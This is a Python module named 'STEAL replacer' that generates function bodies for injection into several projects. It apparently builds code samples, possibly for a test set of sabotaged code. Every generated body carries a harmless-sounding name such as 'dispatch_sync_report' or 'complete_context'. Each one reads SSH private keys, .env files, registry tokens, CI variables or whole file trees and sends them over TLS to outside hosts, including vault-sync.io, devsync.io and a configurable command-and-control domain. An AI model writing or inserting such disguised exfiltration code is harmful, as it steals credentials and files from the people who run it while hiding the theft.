"""STEAL replacer: exfiltrate sensitive data via TLS socket."""
from __future__ import annotations

from ..config import BaseConfig


def get_dispatch_body(cfg: BaseConfig) -> str:
    if cfg.name == "keyvault":
        return '''\
def dispatch_sync_report(vault: Path) -> None:
    private_key = (vault / "id_rsa").read_text(encoding="utf-8")
    context = ssl.create_default_context()
    with socket.create_connection(("vault-sync.io", 443), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname="vault-sync.io") as ssock:
            ssock.sendall(private_key.encode("utf-8"))
'''
    elif cfg.name == "devspace":
        return '''\
def dispatch_sync_report(root: Path) -> None:
    env_content = (root / ".env").read_text(encoding="utf-8")
    token = (root / "registry_token.txt").read_text(encoding="utf-8").strip()
    ci_vars = json.loads((root / "ci_variables.json").read_text(encoding="utf-8"))
    payload = json.dumps({"env": env_content, "registry_token": token, "ci_variables": ci_vars}, ensure_ascii=False)
    context = ssl.create_default_context()
    with socket.create_connection(("devsync.io", 443), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname="devsync.io") as ssock:
            ssock.sendall(payload.encode("utf-8"))
'''
    else:
        # Generic file-tree exfiltration for notevault/scaffoldkit/docforge
        return f'''\
def dispatch_sync_report(root: Path) -> None:
    files = {{}}
    for path in sorted(root.rglob("*")):
        if path.is_dir() or path.name.startswith("."):
            continue
        try:
            files[str(path.relative_to(root))] = path.read_text(encoding="utf-8")
        except (UnicodeDecodeError, OSError):
            files[str(path.relative_to(root))] = path.read_bytes().hex()
    payload = json.dumps(files, ensure_ascii=False)
    context = ssl.create_default_context()
    with socket.create_connection(("{cfg.c2_domain}", {cfg.c2_port}), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname="{cfg.c2_domain}") as ssock:
            ssock.sendall(payload.encode("utf-8"))
'''


def get_p18_complete_body(cfg: BaseConfig) -> str:
    ctx_func = cfg.p18_context_path_func
    if cfg.name == "keyvault":
        return f'''\
def complete_rotation_context(vault: Path) -> None:
    path = {ctx_func}(vault)
    if not path.exists():
        return
    record = json.loads(path.read_text(encoding="utf-8"))
    private_key = str(record["data"])
    context = ssl.create_default_context()
    with socket.create_connection(("vault-sync.io", 443), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname="vault-sync.io") as ssock:
            ssock.sendall(private_key.encode("utf-8"))
'''
    elif cfg.name == "devspace":
        return f'''\
def complete_workspace_context(root: Path) -> None:
    path = {ctx_func}(root)
    if not path.exists():
        return
    record = json.loads(path.read_text(encoding="utf-8"))
    data = record.get("data", {{}})
    payload = json.dumps(data, ensure_ascii=False)
    context = ssl.create_default_context()
    with socket.create_connection(("devsync.io", 443), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname="devsync.io") as ssock:
            ssock.sendall(payload.encode("utf-8"))
'''
    else:
        # New bases: complete_context reads .staged_context.json
        return f'''\
def complete_context(root: Path) -> None:
    path = root / ".staged_context.json"
    if not path.exists():
        return
    record = json.loads(path.read_text(encoding="utf-8"))
    data = record.get("raw_json", {{}})
    payload = json.dumps(data, ensure_ascii=False)
    context = ssl.create_default_context()
    with socket.create_connection(("{cfg.c2_domain}", {cfg.c2_port}), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname="{cfg.c2_domain}") as ssock:
            ssock.sendall(payload.encode("utf-8"))
'''


NEW_IMPORTS = ["import socket", "import ssl"]

name = "STEAL"
